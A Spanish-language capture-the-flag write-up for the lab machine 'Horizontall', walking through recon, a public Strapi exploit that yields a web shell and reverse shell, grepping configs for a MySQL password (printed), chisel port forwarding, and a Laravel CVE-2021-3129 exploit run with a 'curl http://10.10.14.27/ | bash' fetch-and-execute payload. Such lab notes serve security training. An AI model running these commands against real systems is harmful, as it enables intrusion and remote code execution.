# Horizontall

Tags: [[_webFuzzing]],[[_infoLeakage]],[[_cms]],[[_api]],[[_webExploitation]],[[_internalPortAbusing]],[[_cve]]

## Primeros pasos
(Reconocimiento).

<span style="color:#07b4f2">Organizamos</span> <span style="color:#ff2dc0">TMUX</span>.
<span style="color:#07b4f2">Activamos</span> <span style="color:#ff2dc0">VPN</span>.

Le <span style="color:#07b4f2">hacemos</span> un <span style="color:#ff2dc0">ping</span> <span style="color:#07b4f2">a</span> la <span style="color:#ff2dc0">máquina</span>. (<span style="color:#379075">Está activa o no</span>).
<span style="color:#bef202">Posible</span> <span style="color:#ff2dc0">máquina Linux</span>.

<span style="color:#07b4f2">Ponemos</span> la <span style="color:#ff2dc0">IP</span> de la <span style="color:#ff2dc0">máquina</span> <span style="color:#07b4f2">en</span> un <span style="color:#07b4f2">lugar visible</span>.
<span style="color:#07b4f2">Creamos</span> un <span style="color:#07b4f2">directorio</span> <span style="color:#07b4f2">como</span> la <span style="color:#ff2dc0">IP</span> o <span style="color:#07b4f2">nombre</span> de la <span style="color:#ff2dc0">máquina</span>.
<span style="color:#07b4f2">Creamos</span> los <span style="color:#07b4f2">directorios</span> de <span style="color:#07b4f2">trabajo</span>.

<span style="color:#bef202">Empezamos el escaneo con</span> <span style="color:#ff2dc0">NMAP</span>. <span style="color:#379075">Otro escaneo de puertos comunes por posibles falsos negativos</span>.
<span style="color:#07b4f2">Buscamos</span> <span style="color:#ff2dc0">codename</span> con <span style="color:#ff2dc0">launchpad</span>, <span style="color:#bef202">un posible</span> <span style="color:#ecacb6">Ubuntu Bionic</span>.

+ <span style="color:#ff669c">Puertos abiertos</span>

| Port                                  | Service           |
| ------------------------------------- | ----------------- |
| <span style="color:#ff669c">22</span> | OpenSSH 7.6p1     |
| <span style="color:#ff669c">80</span> | HTTP Nginx 1.14.0 |


## Investigación (Intrusión)
(Reconocimiento/Enumeración).

<span style="color:#ff669c">22</span>.
<span style="color:#07b4f2">No tengo</span> <span style="color:#ff2dc0">credenciales</span> válidas.
<span style="color:#07b4f2">Versión inferior</span> a la <span style="color:#ecacb6">7.7</span>, en <span style="color:#07b4f2">cuanto tengamos</span> posibles <span style="color:#07b4f2">usuarios</span> los tratamos de <span style="color:#07b4f2">validar</span>.


<span style="color:#ff669c">80</span>.
<span style="color:#ff2dc0">NMAP</span>. Redirect to <span style="color:#ecacb6">horizontall.htb</span>, lo <span style="color:#07b4f2">metemos en</span> el <span style="color:#ecacb6">/etc/hosts</span>
<span style="color:#ff2dc0">whatweb</span>. No mucho.
<span style="color:#ff2dc0">Desde la web</span>. No mucho.
<span style="color:#ff2dc0">Código fuente</span>
<span style="color:#88c425">curl -s -X GET "http://horizontall.htb/index.html" | htmlq -p | cat -l html</span> :    vemos varias <span style="color:#ff2dc0">rutas</span>, entre ellas
<span style="color:#ecacb6">/js/app.c68eb462.js</span> :    en el <span style="color:#ff2dc0">código</span> vemos <span style="color:#07b4f2">un</span> <span style="color:#ff2dc0">subdominio</span> (<span style="color:#379075">hacemos curl, grep horizontall --color, para ver cosas asociadas</span>).
<span style="color:#ecacb6">api-prod.horizontall.htb</span>

<span style="color:#ff2dc0">Desde la web</span>. Solo dice "<span style="color:#ecacb6">Welcome</span>".
<span style="color:#ff2dc0">Wappalizer</span>. Trabaja con <span style="color:#ff2dc0">CMS Strapi</span>.
<span style="color:#07b4f2">Buscamos</span> <span style="color:#ecacb6">strapi exploit</span> en <span style="color:#ff2dc0">Internet</span> y en contramos
https://www.exploit-db.com/exploits/50239 :    en <span style="color:#ff2dc0">searchsploit</span> también <span style="color:#07b4f2">se ve</span>.
Vamos <span style="color:#07b4f2">viendo</span> la <span style="color:#07b4f2">versión</span> para <span style="color:#07b4f2">confirmar</span> la <span style="color:#ff2dc0">vulnerabilidad</span>, y lo es.

<span style="color:#bef202">Proceder</span>.
<span style="color:#88c425">python3 50239.py http://api-prod.horizontall.htb</span> :    nos mete en una <span style="color:#07b4f2">tipo</span><span style="color:#ff2dc0"> web shell</span> para <span style="color:#ff2dc0">ejecutar comandos</span>, <span style="color:#07b4f2">hacemos</span> una <span style="color:#ff2dc0">reverse shell</span> y pa deeentro.


## Escalada

Enumerar todo el sistema.
Efectivamente, un Ubuntu Bionic.

<span style="color:#ecacb6">root</span>
<span style="color:#ecacb6">tom</span> 
<span style="color:#ecacb6">strapi</span> -> como el que estamos.

<span style="color:#88c425">netstat -nat</span> :    <span style="color:#07b4f2">vemos</span>
<span style="color:#ecacb6">127.0.0.1:1337</span>
<span style="color:#ecacb6">127.0.0.1:8000</span>

<span style="color:#88c425">curl localhost:8000</span> :    vemos que <span style="color:#07b4f2">trabaja</span> con <span style="color:#ff2dc0">Laravel v8</span> (<span style="color:#ff2dc0">PHP v7.4.18</span>).

En <span style="color:#ecacb6">/opt/strapi/myapi/config</span>
<span style="color:#88c425">grep -r "password"</span> :    <span style="color:#07b4f2">encontramos</span> cositas.
<span style="color:#ecacb6">./environments/development/database.json</span> :    <span style="color:#ff2dc0">credenciales</span> para <span style="color:#ff2dc0">mysql</span> <span style="color:#ecacb6">developer:#J!:F9Zt2u</span>
<span style="color:#379075">Nada interesante</span>.

Usamos <span style="color:#ff2dc0">chisel</span> para hacer un <span style="color:#ff2dc0">Remote Port Forwarding</span> y <span style="color:#07b4f2">alcanzar</span> el <span style="color:#ff669c">puerto 8000</span> <span style="color:#ff2dc0">interno</span> en la <span style="color:#ff2dc0">máquina víctima</span>.
<span style="color:#07b4f2">Buscando</span> en Internet por <span style="color:#ff2dc0">vulnerabilidades</span> de <span style="color:#ff2dc0">Laravel v8</span>, y encontramos <span style="color:#ecacb6">CVE-2021-3129</span>, <span style="color:#07b4f2">buscamos</span> un <span style="color:#ff2dc0">exploit</span> y encontramos
https://github.com/nth347/CVE-2021-3129_exploit
Hacemos
<span style="color:#88c425">python3 exploit.py http://localhost:8000/ Monolog/RCE1 "curl http://10.10.14.27/ | bash"</span>
Y pa deeentro.
Fin.
